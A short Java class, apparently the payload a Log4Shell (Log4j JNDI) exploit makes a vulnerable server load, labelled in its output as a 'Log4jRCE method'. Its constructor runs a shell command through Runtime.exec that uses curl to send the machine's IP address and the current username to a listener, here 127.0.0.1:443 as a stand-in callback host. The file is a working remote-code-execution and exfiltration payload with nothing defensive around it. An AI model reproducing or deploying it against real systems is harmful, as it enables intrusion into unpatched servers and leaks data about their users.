import java.util.Properties;
import java.net.InetAddress;
import java.net.UnknownHostException;


public class wap {

    public wap(){
       System.out.println("starting Log4jRCE method");
       InetAddress ip;
        //String hostname = " ";
        try {
            ip = InetAddress.getLocalHost();
            //hostname = ip.getHostName();
            System.out.println("Your current IP address : " + ip);
          //  System.out.println("Your current Hostname : " + hostname);
       try {
            //String[] cmd = {"sh","-c","curl 127.0.0.1:443/" + System.getProperty("user.name")};
            String[] cmd = {"sh","-c","curl 127.0.0.1:443/" + ip + "/" + System.getProperty("user.name")};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        System.out.println("Finished Log4jRCE method");
    }
}